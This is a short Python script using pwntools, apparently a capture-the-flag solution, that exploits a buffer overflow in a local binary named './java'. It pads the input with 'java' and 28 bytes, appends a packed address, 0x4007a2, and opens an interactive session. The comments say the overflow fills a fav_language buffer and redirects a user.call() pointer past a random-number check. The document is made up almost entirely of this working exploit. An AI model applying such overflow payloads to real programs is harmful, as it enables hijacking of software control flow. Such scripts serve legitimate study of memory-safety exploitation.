from pwn import * 
from pwnlib.util.packing import p64

target_address = p64(0x4007a2)              
garbage = b'java' + b'a'*28                 
msgin = garbage + target_address             
                                     
p = process('./java') 
p.sendline(msgin) 
p.interactive() 

# Address of the instruction right after the "if(rand!=...)" statement
# Fill the fav_language buffer
# Overflow the input so that calling java the user.call() will not be overwritten and the user.call() will go to the unreachable address